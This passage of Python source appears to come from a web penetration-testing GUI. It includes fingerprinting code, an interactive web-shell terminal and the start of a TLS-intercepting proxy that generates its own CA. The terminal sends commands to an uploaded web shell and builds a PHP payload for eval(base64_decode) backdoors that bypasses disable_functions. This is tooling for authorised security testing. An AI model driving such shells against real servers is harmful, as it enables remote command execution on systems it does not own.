        # thinner than they could be.
        missing_engine = (
            ('techcli' in allow and not (shutil.which('httpx')
                or shutil.which('httpx-toolkit') or shutil.which('webanalyze')))
            or ('wapp' in allow and not WAPPALYZER_AVAILABLE)
            or ('whatweb' in allow and not shutil.which('whatweb'))
            or ('nmap' in allow and not shutil.which('nmap'))
            or ('wafw00f' in allow and not shutil.which('wafw00f')))

        order = ['http', 'techcli', 'wapp', 'sech', 'httpver', 'tls', 'dns',
                 'cname', 'whois', 'favicon', 'sitemeta', 'cmsver', 'wafw00f',
                 'whatweb', 'ports', 'nmap', 'waf', 'paths', 'options']
        chunks = [sections[n] for n in order
                  if n in sections and sections[n] and sections[n].strip()]
        if missing_engine:
            chunks.append('── Notes ──\n  • Some optional detection engines are '
                          'not installed — results may be incomplete.')
        return '\n\n'.join(chunks)


# Module-level names kept as aliases to the helper methods so the rest
# of the code can keep calling them unqualified.
load_settings = helper.load_settings
save_settings = helper.save_settings
apply_font_size = helper.apply_font_size
apply_theme = helper.apply_theme
parse_raw_request = helper.parse_raw_request
parse_raw_response = helper.parse_raw_response
format_raw_response = helper.format_raw_response
send_raw_request = helper.send_raw_request
split_req_body = helper.split_req_body
combine_req_body = helper.combine_req_body
_make_int_matcher = helper._make_int_matcher
_passes_filters = helper._passes_filters
compute_data_in = helper.compute_data_in
compute_data_out = helper.compute_data_out
format_data_out = helper.format_data_out
_urlencode_keypress = helper._urlencode_keypress
_bind_urlencode = helper._bind_urlencode
fingerprint_target = helper.fingerprint_target


# ─────────────────────────────────────────────
# Shell tooling — mark a node as an uploaded web shell and drive it
# ─────────────────────────────────────────────
def _resolve_shell_url(base_url, name):
    """Resolve a web-shell path entered by the user against a node URL, treating
    the node's full path as a DIRECTORY: a node 'http://h/images' + 'shell.jpg'
    → 'http://h/images/shell.jpg' (not '/shell.jpg'). An absolute path or full
    URL in `name` overrides the base as usual. Query/fragment on the base are
    dropped (they aren't part of a directory path)."""
    name = (name or '').strip()
    if not name:
        return base_url
    pu = urlparse(base_url or '')
    path = pu.path or '/'
    if not path.endswith('/'):
        path += '/'
    base = f'{pu.scheme or "http"}://{pu.netloc}{path}'
    try:
        return urljoin(base, name)
    except Exception:
        return name


class SetShellDialog(ModalToplevel):
    """Small dialog to create an uploaded-web-shell node as a child of the
    selected node: the operator gives the shell's file name / path (resolved
    against the node URL), the parameter the shell reads commands from, and the
    HTTP method (GET/POST). Calls `on_apply(name, param, method)`."""
    def __init__(self, parent, node: SiteNode, on_apply):
        """Build the two-field form (name + param) with a live request preview."""
        super().__init__(parent)
        self.node = node
        self.on_apply = on_apply
        self.title('Set Shell')
        self.configure(bg=C['bg'])

        wrap = tk.Frame(self, bg=C['bg'])
        wrap.pack(fill='both', expand=True, padx=10, pady=10)
        tk.Label(wrap, text='Create a web shell node under this node:',
                 bg=C['bg'], font=C['font_b']).grid(
            row=0, column=0, columnspan=2, sticky='w', pady=(0, 8))

        tk.Label(wrap, text='Shell file / path:', bg=C['bg'],
                 font=C['font']).grid(row=1, column=0, sticky='e',
                                      padx=(0, 6), pady=3)
        self.name_var = tk.StringVar(value=getattr(node, 'shell_name', '') or '')
        ne = Entry95(wrap, textvariable=self.name_var, width=38)
        ne.grid(row=1, column=1, sticky='ew', pady=3)

        tk.Label(wrap, text='Command parameter:', bg=C['bg'],
                 font=C['font']).grid(row=2, column=0, sticky='e',
                                      padx=(0, 6), pady=3)
        self.param_var = tk.StringVar(value=getattr(node, 'shell_param', '') or '')
        Entry95(wrap, textvariable=self.param_var, width=38).grid(
            row=2, column=1, sticky='ew', pady=3)

        # HTTP method the shell reads the command from: GET (?param=) or POST.
        tk.Label(wrap, text='Method:', bg=C['bg'],
                 font=C['font']).grid(row=3, column=0, sticky='e',
                                      padx=(0, 6), pady=3)
        self.method_var = tk.StringVar(
            value=(getattr(node, 'shell_method', 'GET') or 'GET').upper())
        mrow = tk.Frame(wrap, bg=C['bg'])
        mrow.grid(row=3, column=1, sticky='w', pady=3)
        for m in ('GET', 'POST'):
            tk.Radiobutton(mrow, text=m, value=m, variable=self.method_var,
                           bg=C['bg'], activebackground=C['bg'],
                           selectcolor=C['window'], highlightthickness=0,
                           font=C['font']).pack(side='left', padx=(0, 8))

        tk.Label(wrap, text='Request preview:', bg=C['bg'],
                 font=C['font']).grid(row=4, column=0, sticky='e',
                                      padx=(0, 6), pady=(8, 3))
        self.prev_var = tk.StringVar(value='')
        Entry95(wrap, textvariable=self.prev_var, width=38, state='readonly',
                readonlybackground=C['window']).grid(
            row=4, column=1, sticky='ew', pady=(8, 3))
        wrap.columnconfigure(1, weight=1)

        bar = tk.Frame(wrap, bg=C['bg'])
        bar.grid(row=5, column=0, columnspan=2, sticky='e', pady=(12, 0))
        Btn(bar, text='OK', command=self._ok, width=8).pack(side='left', padx=(0, 6))
        Btn(bar, text='Cancel', command=self.destroy, width=8).pack(side='left')

        self.name_var.trace_add('write', lambda *_: self._update_preview())
        self.param_var.trace_add('write', lambda *_: self._update_preview())
        self.method_var.trace_add('write', lambda *_: self._update_preview())
        self._update_preview()
        ne.focus_set()

        self.update_idletasks()
        px = parent.winfo_rootx() + parent.winfo_width() // 2 - 210
        py = parent.winfo_rooty() + parent.winfo_height() // 2 - 90
        self.geometry(f'+{max(px, 0)}+{max(py, 0)}')

    def _shell_url(self) -> str:
        """The resolved shell URL: the entered name resolved against the node URL
        as a directory (so 'shell.jpg' under http://h/images →
        http://h/images/shell.jpg)."""
        name = self.name_var.get().strip()
        if not name:
            return self.node.url
        return _resolve_shell_url(self.node.url, name)

    def _update_preview(self):
        """Refresh the read-only preview of the request the web shell will send."""
        param = self.param_var.get().strip() or '<param>'
        if self.method_var.get() == 'POST':
            self.prev_var.set(f'POST {self._shell_url()}  ({param}=<command>)')
        else:
            self.prev_var.set(f'GET {self._shell_url()}?{param}=<command>')

    def _ok(self):
        """Validate (name and command parameter required), hand them to the
        caller and close."""
        name = self.name_var.get().strip()
        if not name:
            messagebox.showinfo(
                'Shell name required',
                'Enter the shell file name or path (e.g. shell.jpg).')
            return
        param = self.param_var.get().strip()
        if not param:
            messagebox.showinfo(
                'Command parameter required',
                'Enter the query parameter the shell reads the command from '
                '(e.g. cmd).')
            return
        self.on_apply(name, param, self.method_var.get())
        self.destroy()


class WebShellDialog(tk.Toplevel):
    """An interactive web-shell terminal for a 'shell' node. Each command typed
    at the prompt is sent to the shell URL — in the query string (`?<param>=…`)
    for a GET shell or the form body for a POST shell, per the node's method —
    and the raw response body is printed back, console-style.

    The 'URL Encode Commands' checkbox percent-encodes the command on the wire
    (GET only); 'PHP eval(base64) — POST' targets an
    eval(base64_decode($_POST[param])) backdoor — the operator still types plain
    shell commands and the terminal wraps them in a PHP exec runner (see
    _php_b64_payload), so the experience is the same as a normal shell. The
    terminal always shows what the operator actually typed. The window is a plain
    (non-modal) Toplevel so it can stay open and be freely resized."""
    def __init__(self, parent, node: SiteNode):
        """Resolve the shell URL/param from `node`, build the terminal widget and
        bind the line-discipline key handlers."""
        super().__init__(parent)
        self.node = node
        self.shell_url = self._resolve_url(node)
        self.param = getattr(node, 'shell_param', '') or ''
        self.method = (getattr(node, 'shell_method', 'GET') or 'GET').upper()
        self.encode_var = tk.BooleanVar(value=True)
        # When set, the shell is a PHP eval(base64_decode($_POST[param])) backdoor:
        # the typed command is wrapped in PHP, base64-encoded, and POSTed.
        self.php_b64_var = tk.BooleanVar(value=False)
        self.prompt = '$ '
        self._busy = False
        self._history: list = []
        self._hist_idx = 0
        self.title(f'Web Shell — {self.shell_url}')
        self.configure(bg='#000000')
        self.minsize(380, 220)
        try:
            self.transient(parent)
        except tk.TclError:
            pass

        # Top strip (Win9x grey so the checkbox + target read clearly).
        top = tk.Frame(self, bg=C['bg'])
        top.pack(fill='x')
        tk.Checkbutton(top, text='URL Encode Commands', variable=self.encode_var,
                       bg=C['bg'], activebackground=C['bg'],
                       selectcolor=C['window'], highlightthickness=0,
                       font=C['font']).pack(side='left', padx=4, pady=2)
        tk.Checkbutton(top, text='PHP eval(base64) — POST', variable=self.php_b64_var,
                       bg=C['bg'], activebackground=C['bg'],
                       selectcolor=C['window'], highlightthickness=0,
                       font=C['font']).pack(side='left', padx=4, pady=2)
        _sep = '?' if self.method == 'GET' else '  '
        tk.Label(top, text=f'{self.method} {self.shell_url}{_sep}{self.param}=…',
                 bg=C['bg'], fg=C['black'], font=C['font']).pack(side='right', padx=6)

        wrap = tk.Frame(self, bg='#000000')
        wrap.pack(fill='both', expand=True)
        # The web-shell terminal keeps its own classic green-on-black palette
        # (exempt from the app-wide green/red unification): bright green text,
        # dimmer green echoes, bright-red errors.
        self.txt = tk.Text(wrap, bg='#000000', fg='#00ff00',
                           insertbackground='#00ff00',
                           font=('Courier', 11, 'bold'),
                           wrap='char', relief='flat', bd=0, padx=6, pady=4,
                           highlightthickness=0)
        sb = tk.Scrollbar(wrap, command=self.txt.yview)
        self.txt.config(yscrollcommand=sb.set)
        sb.pack(side='right', fill='y')
        self.txt.pack(side='left', fill='both', expand=True)
        self.txt.tag_config('dim', foreground='#00aa00')
        # Server responses in bold bright cyan; errors in bold bright red (the
        # whole terminal font is already bold).
        self.txt.tag_config('resp', foreground='#00ffff')
        self.txt.tag_config('err', foreground='#ff0000')

        self._banner()
        self._emit_prompt()

        self.txt.bind('<Return>',    self._on_return)
        self.txt.bind('<BackSpace>', self._guard_back)
        self.txt.bind('<Up>',        self._hist_prev)
        self.txt.bind('<Down>',      self._hist_next)
        self.txt.bind('<Home>',      self._go_input_start)
        self.txt.bind('<Key>',       self._guard_key)
        self.txt.bind('<Button-1>',  lambda e: self.after(1, self._maybe_to_input))
        self.txt.focus_set()

        self.update_idletasks()
        px = parent.winfo_rootx() + parent.winfo_width() // 2 - 410
        py = parent.winfo_rooty() + parent.winfo_height() // 2 - 260
        self.geometry(f'820x520+{max(px, 0)}+{max(py, 0)}')

    @staticmethod
    def _resolve_url(node: SiteNode) -> str:
        """The shell's request URL. The shell node's own URL already IS the
        resolved shell location (built when the node was created), so just use
        it — minus any '#shell-N' disambiguation fragment we appended."""
        return (node.url or '').split('#', 1)[0]

    # ── terminal text plumbing ──
    def _banner(self):
        """Print the intro banner describing the shell target and usage."""
        self.txt.insert(
            'end',
            'Reconner Web Shell\n'
            f'Target : {self.shell_url}\n'
            f'Param  : {self.param}\n'
            'Type a command and press Enter — output is the raw server response.\n\n',
            'dim')

    def _emit_prompt(self):
        """Write a fresh prompt and anchor the editable input region at it."""
        self.txt.insert('end', self.prompt)
        self.txt.mark_set('insert', 'end')
        self.txt.mark_set('input', 'insert')
        self.txt.mark_gravity('input', 'left')
        self.txt.see('end')

    def _current_command(self) -> str:
        """The text the operator has typed after the current prompt."""
        return self.txt.get('input', 'end').rstrip('\n')

    def _replace_input(self, text: str):
        """Replace the current input line with `text` (used by history recall)."""
        self.txt.delete('input', 'end')
        self.txt.insert('end', text)
        self.txt.mark_set('insert', 'end')
        self.txt.see('end')

    # ── key handlers (a tiny line discipline over the Text widget) ──
    def _guard_back(self, _e=None):
        """Stop Backspace from eating the prompt or earlier output."""
        if self._busy or self.txt.compare('insert', '<=', 'input'):
            return 'break'

    def _go_input_start(self, _e=None):
        """Home jumps to the start of the editable input, not the line."""
        self.txt.mark_set('insert', 'input')
        return 'break'

    def _maybe_to_input(self):
        """After a click in the read-only region, snap the caret back to input."""
        if self.txt.compare('insert', '<', 'input'):
            self.txt.mark_set('insert', 'end')

    def _guard_key(self, e):
        """Keep edits inside the input line and freeze input while a command is
        in flight (Ctrl-combos like copy still pass through)."""
        if e.state & 0x4:          # Control held → let shortcuts through
            return None
        if self._busy:
            return 'break'
        if e.char and e.char.isprintable() and \
                self.txt.compare('insert', '<', 'input'):
            self.txt.mark_set('insert', 'end')
        return None

    def _on_return(self, _e=None):
        """Enter: take the typed command, echo a newline and run it. clear/cls are
        handled locally (they only wipe this terminal's screen — cosmetic, nothing
        on the wire). Anything else, including exit/quit, is sent to the server:
        the window is closed via its title-bar ✕, never by a typed command, so a
        command meant for the remote host (which could be stateful) is never
        swallowed by the terminal."""
        if self._busy:
            return 'break'
        cmd = self._current_command()
        self.txt.mark_set('insert', 'end')
        self.txt.insert('end', '\n')
        if not cmd.strip():
            self._emit_prompt()
            return 'break'
        self._history.append(cmd)
        self._hist_idx = len(self._history)
        if cmd.strip().lower() in ('clear', 'cls'):
            self._clear()
            return 'break'
        self._run(cmd)
        return 'break'

    def _clear(self):
        """Local 'clear'/'cls': wipe the terminal back to the permanent banner
        and a fresh prompt. Nothing is sent to the server."""
        self.txt.delete('1.0', 'end')
        self._banner()
        self._emit_prompt()

    def _hist_prev(self, _e=None):
        """Up: recall the previous command from history into the input line."""
        if self._busy or not self._history:
            return 'break'
        self._hist_idx = max(0, self._hist_idx - 1)
        self._replace_input(self._history[self._hist_idx])
        return 'break'

    def _hist_next(self, _e=None):
        """Down: recall the next command (or clear past the newest)."""
        if self._busy or not self._history:
            return 'break'
        self._hist_idx = min(len(self._history), self._hist_idx + 1)
        self._replace_input('' if self._hist_idx >= len(self._history)
                            else self._history[self._hist_idx])
        return 'break'

    # ── request / response ──
    def _build_url(self, cmd: str) -> str:
        """Build the GET URL carrying `cmd` in the shell's command parameter,
        percent-encoding the value only when 'URL Encode Commands' is ticked."""
        value = quote(cmd, safe='') if self.encode_var.get() else cmd
        sep = '&' if urlparse(self.shell_url).query else '?'
        return f'{self.shell_url}{sep}{self.param}={value}'

    def _php_b64_payload(self, cmd: str) -> str:
        """Build the POST value for an eval(base64_decode($_POST[param])) shell so
        the operator types plain shell commands and gets their output back.

        The command is base64-encoded (to sidestep quoting) and wrapped in a PHP
        runner that executes it through whichever exec function is actually
        available — system → passthru → shell_exec → exec → proc_open — skipping
        any listed in disable_functions (function_exists() alone returns true for
        disabled funcs, so we also check the list). If none are usable it prints a
        clear notice with disable_functions, instead of a silent empty 200. The
        whole runner is then base64-encoded for the server's outer base64_decode."""
        b64 = base64.b64encode(cmd.encode('utf-8', 'surrogateescape')).decode()
        php = (
            '$c=base64_decode("' + b64 + '");'
            '$x=",".str_replace(" ","",(string)ini_get("disable_functions")).",";'
            'if(function_exists("system")&&strpos($x,",system,")===false){system($c);}'
            'elseif(function_exists("passthru")&&strpos($x,",passthru,")===false){passthru($c);}'
            'elseif(function_exists("shell_exec")&&strpos($x,",shell_exec,")===false){echo shell_exec($c);}'
            'elseif(function_exists("exec")&&strpos($x,",exec,")===false){exec($c,$o);echo implode(chr(10),$o);}'
            'elseif(function_exists("proc_open")&&strpos($x,",proc_open,")===false){'
            '$p=proc_open($c,array(1=>array("pipe","w"),2=>array("pipe","w")),$pp);'
            'if(is_resource($p)){echo stream_get_contents($pp[1]).stream_get_contents($pp[2]);proc_close($p);}}'
            'else{echo "[no exec function available — disable_functions=".$x."]";}'
        )
        return base64.b64encode(php.encode()).decode()

    def _run(self, cmd: str):
        """Send the command on a background thread so the UI stays responsive.
        The transport is chosen in this order: PHP eval(base64) mode POSTs the
        base64-wrapped payload; otherwise the shell's own method (set at creation)
        decides — POST sends the command in the form body, GET puts it in the
        query param (see _php_b64_payload / _build_url)."""
        self._busy = True
        if self.php_b64_var.get():
            method, url, data = 'POST', self.shell_url, {
                self.param: self._php_b64_payload(cmd)}
        elif self.method == 'POST':
            method, url, data = 'POST', self.shell_url, {self.param: cmd}
        else:
            method, url, data = 'GET', self._build_url(cmd), None

        def work():
            """Worker: perform the request and hand the parsed result to the UI."""
            is_err, out = self._fetch(method, url, data)
            if not self.winfo_exists():
                return
            self.after(0, lambda: self._done(is_err, out))

        threading.Thread(target=work, daemon=True).start()

    def _fetch(self, method: str, url: str, data=None):
        """Send the request (GET, or POST with form `data`) and return
        (is_error, display_text) — the response parsed into clean command output
        or a concise error message."""
        if not REQUESTS_AVAILABLE:
            return True, 'requests not installed: pip install requests'
        try:
            if method == 'POST':
                r = requests.post(url, data=data, timeout=20, verify=False,
                                  allow_redirects=True)
            else:
                r = requests.get(url, timeout=20, verify=False, allow_redirects=True)
        except Exception as ex:
            return True, f'request error: {ex}'
        return self._parse_output(r.status_code, r.reason, r.text or '')

    # Interpreter (PHP) error signatures that can appear inside a 200 response.
    _ERR_RE = re.compile(r'(?i)\b(Parse error|Fatal error|Warning|'
                         r'Uncaught\s+\w*\s*error)\b')

    @staticmethod
    def _looks_html(s: str) -> bool:
        """Heuristic: does the response body look like HTML rather than the raw
        stdout of a command?"""
        low = s.lower()
        return any(t in low for t in ('<!doctype html', '<html', '<br', '</',
                                      '<b>', '<p>', '<h1'))

    @staticmethod
    def _html_to_text(s: str) -> str:
        """Strip HTML to readable text: drop script/style, turn block/break tags
        into newlines, remove the rest, decode entities and tidy blank lines."""
        t = re.sub(r'(?is)<(script|style)\b.*?</\1>', '', s)
        t = re.sub(r'(?i)<br\s*/?>', '\n', t)
        t = re.sub(r'(?i)</(p|div|h[1-6]|tr|li|address|pre)>', '\n', t)
        t = re.sub(r'(?s)<[^>]+>', '', t)
        t = _html.unescape(t)
        t = re.sub(r'[ \t]+\n', '\n', t)
        t = re.sub(r'\n{3,}', '\n\n', t)
        return t.strip()

    def _parse_output(self, status, reason, body: str):
        """Parse a raw web-shell HTTP response into (is_error, display_text).

        - An interpreter error in the body (PHP Fatal/Parse/Warning/Uncaught) is
          surfaced as a single 'Error: …' line (HTML stripped, stack trace cut).
        - An HTTP 4xx/5xx is reported as 'Error: HTTP <code> <reason> — <detail>'
          using the server error page's first descriptive line.
        - Otherwise the command output is shown verbatim (like a real shell), so
          output that legitimately contains markup isn't mangled."""
        raw = body or ''
        # 1) Interpreter error anywhere in the response → concise error line.
        if self._ERR_RE.search(raw):
            clean = self._html_to_text(raw) if self._looks_html(raw) else raw
            m = self._ERR_RE.search(clean)
            snippet = (clean[m.start():] if m else clean)
            snippet = re.split(r'(?i)\bStack trace:', snippet)[0].strip()
            return True, 'Error: ' + ' '.join(snippet.split())
        # 2) HTTP-level error → status line + first meaningful detail.
        if status is not None and status >= 400:
            clean = self._html_to_text(raw) if self._looks_html(raw) else raw.strip()
            detail = ''
            for line in clean.splitlines():
                line = line.strip()
                if (line and not line.lower().startswith(str(status))
                        and line.lower() != (reason or '').lower()):
                    detail = line
                    break
            msg = f'Error: HTTP {status} {reason}'.rstrip()
            if detail:
                msg += f' — {detail}'
            return True, msg
        # 3) Success → raw stdout (trailing newline trimmed; re-added on print).
        out = raw.rstrip('\n')
        if not out.strip():
            return False, f'[HTTP {status} {reason} — empty response]'
        return False, out

    def _done(self, is_err: bool, out: str):
        """Print the parsed output (bold bright red on error, bold bright cyan on
        a server response) and re-prompt."""
        if out and not out.endswith('\n'):
            out += '\n'
        self.txt.insert('end', out, ('err',) if is_err else ('resp',))
        self._busy = False
        self._emit_prompt()


# ─────────────────────────────────────────────
# inspector — request/response tooling
# ─────────────────────────────────────────────
class inspector:
    """Single entry point for the per-node inspection tools. Each method opens
    the corresponding dialog implementation:
      • repeater()        — replay / edit a request and re-send it
      • fuzzer()          — replay the request with a payload list
      • shell()           — drive an uploaded web shell as a terminal
    Returns the opened dialog (useful for tests); the dialogs manage themselves."""

    @staticmethod
    def repeater(parent, node, on_save=None):
        """Open the Repeater dialog for `node` and return it."""
        return RequestEditorDialog(parent, node, on_save=on_save)

    @staticmethod
    def fuzzer(parent, node, on_save=None):
        """Open the Fuzzer dialog for `node` and return it."""
        return FuzzerDialog(parent, node, on_save=on_save)

    @staticmethod
    def shell(parent, node):
        """Open the interactive Web Shell terminal for a shell `node`."""
        return WebShellDialog(parent, node)


# ─────────────────────────────────────────────
# Intercepting proxy (HTTP + HTTPS) — ZAP/Burp style
# ─────────────────────────────────────────────
PROXY_CA_DIR  = SETTINGS_DIR / 'ca'
PROXY_CA_CERT = PROXY_CA_DIR / 'reconner-ca.crt'
PROXY_CA_KEY  = PROXY_CA_DIR / 'reconner-ca.key'
# Where the CA lands in the system trust store (update-ca-certificates picks it
# up from here); Firefox reads it via security.enterprise_roots.enabled.
PROXY_CA_SYS_DST = Path('/usr/local/share/ca-certificates/reconner-ca.crt')

# Hop-by-hop headers must not be forwarded end-to-end (RFC 7230 §6.1); the
# interceptor re-derives Host/Content-Length/encoding itself.
_HOP_BY_HOP = {'connection', 'proxy-connection', 'keep-alive', 'transfer-encoding',
               'te', 'trailer', 'upgrade', 'proxy-authorization',
               'proxy-authenticate'}


class ProxyCA:
    """Self-signed certificate authority for the HTTPS interceptor. Generates (or
    loads) a long-lived CA under ~/.reconner/ca/, then mints short per-host leaf
    certs on demand (signed by the CA) and caches a server-side ssl.SSLContext per
    host so a CONNECT tunnel can be TLS-terminated and decrypted. Requires the
    `cryptography` package; without it the proxy can only blind-tunnel HTTPS."""

    def __init__(self):
        """Load the CA from disk, generating it on first use. Holds the per-host
        SSLContext cache and one reused leaf key."""
        self._ctx_cache: dict[str, ssl.SSLContext] = {}
        self._leaf_key = None
        self._lock = threading.Lock()
        self.ca_cert = None
        self.ca_key = None
        if CRYPTO_AVAILABLE:
            self._load_or_create()

    def available(self) -> bool:
        """True when TLS interception is possible (cryptography present + CA loaded)."""
        return bool(CRYPTO_AVAILABLE and self.ca_cert is not None)

    def _load_or_create(self):
        """Load the CA cert+key from disk, or generate and persist a new one."""
        try:
            if PROXY_CA_CERT.exists() and PROXY_CA_KEY.exists():
                self.ca_cert = x509.load_pem_x509_certificate(
                    PROXY_CA_CERT.read_bytes())
                self.ca_key = serialization.load_pem_private_key(
                    PROXY_CA_KEY.read_bytes(), password=None)
                return
        except Exception:
            self.ca_cert = self.ca_key = None
        try:
            self._generate()
        except Exception:
            self.ca_cert = self.ca_key = None

    def _generate(self):
        """Generate a fresh CA key+cert and persist them (key mode 0600)."""
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, 'Reconner Proxy CA'),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, 'Reconner'),
        ])
        now = datetime.now(timezone.utc)
        cert = (x509.CertificateBuilder()
                .subject_name(name).issuer_name(name)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=3650))
                .add_extension(x509.BasicConstraints(ca=True, path_length=0),
                               critical=True)
                .add_extension(x509.KeyUsage(
                    digital_signature=True, key_cert_sign=True, crl_sign=True,
                    content_commitment=False, key_encipherment=False,
                    data_encipherment=False, key_agreement=False,
                    encipher_only=False, decipher_only=False), critical=True)
                .add_extension(x509.SubjectKeyIdentifier.from_public_key(
                    key.public_key()), critical=False)
                .sign(key, hashes.SHA256()))
        PROXY_CA_DIR.mkdir(parents=True, exist_ok=True)
        PROXY_CA_CERT.write_bytes(cert.public_bytes(serialization.Encoding.PEM))
        PROXY_CA_KEY.write_bytes(key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption()))
        try:
            os.chmod(PROXY_CA_KEY, 0o600)
        except Exception:
            pass
        self.ca_cert, self.ca_key = cert, key

    def _leaf(self, host: str):
        """Mint (key reused) and sign a leaf cert with SAN=host. Returns (cert, key)."""
        if self._leaf_key is None:
            self._leaf_key = rsa.generate_private_key(
                public_exponent=65537, key_size=2048)
        now = datetime.now(timezone.utc)
        try:
            san = x509.SubjectAlternativeName([x509.DNSName(host)])
        except Exception:
            san = x509.SubjectAlternativeName([x509.DNSName('invalid.local')])
        cert = (x509.CertificateBuilder()
                .subject_name(x509.Name([
                    x509.NameAttribute(NameOID.COMMON_NAME, host)]))
                .issuer_name(self.ca_cert.subject)
                .public_key(self._leaf_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=825))
                .add_extension(san, critical=False)
                .add_extension(x509.BasicConstraints(ca=False, path_length=None),
                               critical=True)
                .add_extension(x509.ExtendedKeyUsage(
                    [x509.oid.ExtendedKeyUsageOID.SERVER_AUTH]), critical=False)
                .add_extension(x509.SubjectKeyIdentifier.from_public_key(
                    self._leaf_key.public_key()), critical=False)
                .add_extension(x509.AuthorityKeyIdentifier.from_issuer_public_key(
                    self.ca_key.public_key()), critical=False)
                .sign(self.ca_key, hashes.SHA256()))
        return cert, self._leaf_key

    def context_for(self, host: str) -> ssl.SSLContext:
        """Return a cached server-side SSLContext presenting a leaf cert for `host`,
        writing the cert+key to temp files (SSLContext loads from paths)."""
        with self._lock:
            ctx = self._ctx_cache.get(host)
            if ctx is not None:
                return ctx
            cert, key = self._leaf(host)
            cf = tempfile.NamedTemporaryFile(
                delete=False, suffix='.pem', prefix='rcn-crt-')
            kf = tempfile.NamedTemporaryFile(
                delete=False, suffix='.pem', prefix='rcn-key-')
            try:
                cf.write(cert.public_bytes(serialization.Encoding.PEM))
                cf.write(self.ca_cert.public_bytes(serialization.Encoding.PEM))
                kf.write(key.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.TraditionalOpenSSL,
                    serialization.NoEncryption()))
                cf.flush(); kf.flush(); cf.close(); kf.close()
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(cf.name, kf.name)
                self._ctx_cache[host] = ctx
                return ctx
            finally:
                for f in (cf.name, kf.name):
                    try:
                        os.unlink(f)
                    except OSError:
                        pass


class ProxyFlow:
    """One proxied request/response transaction. Carries the parsed request and
    (once fetched) response, plus the interception handshake state: a phase
    ('request' | 'response'), an Event the handler thread blocks on, and slots the
    UI thread fills with edited bytes / a drop flag before releasing it."""
    _ids = itertools.count(1)

    def __init__(self, method, scheme, host, port, path, headers, body):
        """Initialise the request side of a flow; the response side stays empty
        until the upstream fetch completes."""
        self.id = next(ProxyFlow._ids)
        self.method = method
        self.scheme = scheme
        self.host = host
        self.port = port
        self.path = path
        self.req_headers = headers          # dict (original-case keys)
        self.req_body = body                # bytes
        self.status = None
        self.reason = ''
        self.resp_headers: dict = {}
        self.resp_body = b''                # bytes (decompressed)
        # Interception handshake
        self.phase = 'request'
        self.event = threading.Event()
        self.dropped = False
        self.skip_response = False

    @property
    def url(self) -> str:
        """The absolute URL for the request line shown/sent (port omitted when
        default for the scheme)."""
        netloc = self.host
        if not ((self.scheme == 'https' and self.port == 443) or
                (self.scheme == 'http' and self.port == 80)):
            netloc = f'{self.host}:{self.port}'
        return f'{self.scheme}://{netloc}{self.path}'

    # ── raw text views (for the 4 editor boxes) ──
    def raw_request(self) -> str:
        """The request as raw HTTP text (request line + headers + blank + body)."""
        lines = [f'{self.method} {self.path} HTTP/1.1']
        for k, v in self.req_headers.items():
            lines.append(f'{k}: {v}')
        body = self.req_body.decode('utf-8', 'replace') if self.req_body else ''
        return '\n'.join(lines) + '\n\n' + body

    def raw_response(self) -> str:
        """The response as raw HTTP text (status line + headers + blank + body)."""
        if self.status is None:
            return ''
        lines = [f'HTTP/1.1 {self.status} {self.reason}']
        for k, v in self.resp_headers.items():
            lines.append(f'{k}: {v}')
        body = self.resp_body.decode('utf-8', 'replace') if self.resp_body else ''
        return '\n'.join(lines) + '\n\n' + body


class _ProxyServer(socketserver.ThreadingTCPServer):
    """Threaded TCP server holding a back-reference to its controller so each
    handler can reach the interception state."""
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, addr, controller):
        """Bind and remember the owning InterceptProxy."""
        self.controller = controller
        super().__init__(addr, _ProxyHandler)


def _read_http_message(rfile):
    """Read one HTTP message off a buffered socket file: returns
    (start_line, headers_dict, body_bytes) or None at EOF. Honours Content-Length
    and chunked Transfer-Encoding for the body."""
    start = rfile.readline()
    if not start:
        return None
    start = start.decode('iso-8859-1').rstrip('\r\n')
    if not start:
        return None
    headers: dict = {}
    while True:
        line = rfile.readline()
        if not line or line in (b'\r\n', b'\n'):
            break
        txt = line.decode('iso-8859-1').rstrip('\r\n')
        if ':' in txt:
            k, v = txt.split(':', 1)
            headers[k.strip()] = v.strip()
    body = b''
    te = headers.get('Transfer-Encoding', '').lower()
    cl = headers.get('Content-Length')
    if 'chunked' in te:
        while True:
            size_line = rfile.readline()
            if not size_line:
                break
            try:
                size = int(size_line.split(b';')[0].strip(), 16)
            except ValueError:
                break
            if size == 0:
                rfile.readline()        # trailing CRLF
                break
            body += rfile.read(size)
            rfile.readline()            # CRLF after each chunk
    elif cl:
        try:
            body = rfile.read(int(cl))
        except (ValueError, OSError):
            body = b''
    return start, headers, body


class _ProxyHandler(socketserver.StreamRequestHandler):
    """Per-connection handler: dispatches the first line to either a CONNECT TLS
    tunnel (HTTPS interception) or a plain-HTTP proxy loop, then services each
    request through the controller (scope gate → intercept gate → upstream send →
    response intercept → write back)."""
    timeout = 120

    def handle(self):
        """Read the first request line and branch to HTTPS (CONNECT) or HTTP."""
        try:
            first = _read_http_message(self.rfile)
        except Exception:
            return
        if not first:
            return
        start, headers, _body = first
        parts = start.split()
        if len(parts) >= 2 and parts[0].upper() == 'CONNECT':
            self._do_connect(parts[1])
        else:
            self._serve_plain(start, headers)

    # ── HTTPS: terminate TLS with a minted cert, then serve requests ──
    def _do_connect(self, authority):
        """Answer CONNECT, TLS-terminate the tunnel with a per-host cert and serve
        the decrypted requests. Falls back to a blind TCP tunnel when TLS MITM is
        unavailable (no cryptography)."""
        host, _, port = authority.partition(':')
        port = int(port or 443)
        ca = self.server.controller.ca
        if not ca.available():
            self._blind_tunnel(host, port)
            return
        try:
            self.wfile.write(b'HTTP/1.1 200 Connection established\r\n\r\n')
            self.wfile.flush()
            ctx = ca.context_for(host)
            tls = ctx.wrap_socket(self.connection, server_side=True)
        except Exception:
            return
        rfile = tls.makefile('rb', buffering=0)
        wfile = tls.makefile('wb', buffering=0)
        try:
            while True:
                msg = _read_http_message(rfile)
                if not msg:
                    break
